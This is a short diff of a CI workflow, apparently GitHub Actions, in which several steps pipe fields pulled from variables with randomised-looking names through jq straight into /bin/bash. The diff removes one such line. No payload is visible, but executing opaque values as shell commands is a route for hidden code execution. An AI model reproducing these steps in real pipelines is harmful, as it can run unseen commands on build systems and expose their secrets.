@@ -26,7 +26,6 @@ jobs:
           echo $ypaq6685 | jq -r .w5 | /bin/bash
           echo $m462 | jq -r .jyu316 | /bin/bash
           echo $v7 | jq -r .wmtq006 | /bin/bash
-          printf '%s' "$tiu22463" | jq -r .hi319 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
